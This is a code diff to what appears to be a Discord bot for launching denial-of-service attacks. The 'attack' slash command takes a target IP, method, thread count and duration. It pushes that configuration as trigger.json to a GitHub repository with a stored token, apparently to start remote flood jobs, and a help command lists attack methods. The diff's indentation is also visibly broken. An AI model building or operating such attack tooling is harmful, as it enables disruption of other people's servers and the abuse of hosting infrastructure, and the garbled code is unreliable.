@@ -62,25 +62,39 @@ async def attack(interaction: discord.Interaction, target_ip: str, method: app_c
 with open(CONFIG_FILE, "r") as f:
     content = f.read()
 
-    try:
-        contents = repo.get_contents("trigger.json", ref=BRANCH)
-        repo.update_file(
-            path=contents.path,
-            message="Update trigger.json",
-            content=content,
-            sha=contents.sha,
-            branch=BRANCH
-        )
-    except Exception as e:
-        if "404" in str(e):
-            repo.create_file(
-                path="trigger.json",
-                message="Create trigger.json",
+        try:
+        g = Github(GITHUB_TOKEN)
+        repo = g.get_repo(REPO_NAME)
+        with open(CONFIG_FILE, "r") as f:
+            content = f.read()
+
+        try:
+            contents = repo.get_contents("trigger.json", ref=BRANCH)
+            repo.update_file(
+                path=contents.path,
+                message="Update trigger.json",
                 content=content,
+                sha=contents.sha,
                 branch=BRANCH
             )
-        else:
-            raise e
+        except Exception as inner:
+            if "404" in str(inner):
+                repo.create_file(
+                    path="trigger.json",
+                    message="Create trigger.json",
+                    content=content,
+                    branch=BRANCH
+                )
+            else:
+                raise inner
+
+        await interaction.response.send_message(
+            f"✅ Target: `{target_ip}` | Method: `{method.value}` | Threads: `{threads}` | Duration: `{duration}`s"
+        )
+
+    except Exception as e:
+        await interaction.response.send_message(f"❌ GitHub push failed: {e}", ephemeral=True)
+
 
 @bot.tree.command(name="help", description="Show all available attack methods")
 async def help_cmd(interaction: discord.Interaction):
